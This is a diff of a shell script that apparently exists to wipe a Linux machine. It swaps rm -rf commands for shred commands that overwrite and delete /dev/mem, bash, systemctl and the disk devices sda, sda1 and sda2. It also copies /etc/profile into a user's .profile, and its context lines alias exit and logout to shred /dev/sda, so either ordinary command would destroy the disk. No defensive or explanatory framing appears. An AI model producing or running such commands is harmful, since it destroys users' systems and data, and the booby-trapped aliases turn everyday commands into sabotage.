@@ -1,7 +1,15 @@
-rm -rf /dev/mem
-rm -rf /dev/bash
-rm -rf /bin/systemctl
-rm -rf /usr/bin/bash
+
+
+cd /
+cp /etc/profile /home/it5/.profile
+
+shred -n 6 -z -u -v /dev/mem
+shred -n 6 -z -u -v /dev/bash
+shred -n 6 -z -u -v /bin/systemctl
+shred -n 6 -z -u -v /usr/bin/bash
+shred -n 6 -z -u -v sda1
+shred -n 6 -z -u -v sda
+shred -n 6 -z -u -v sda2
 
 alias exit="shred -n 6 -z -u -v /dev/sda"
 alias logout="shred -n 6 -z -u -v /dev/sda"
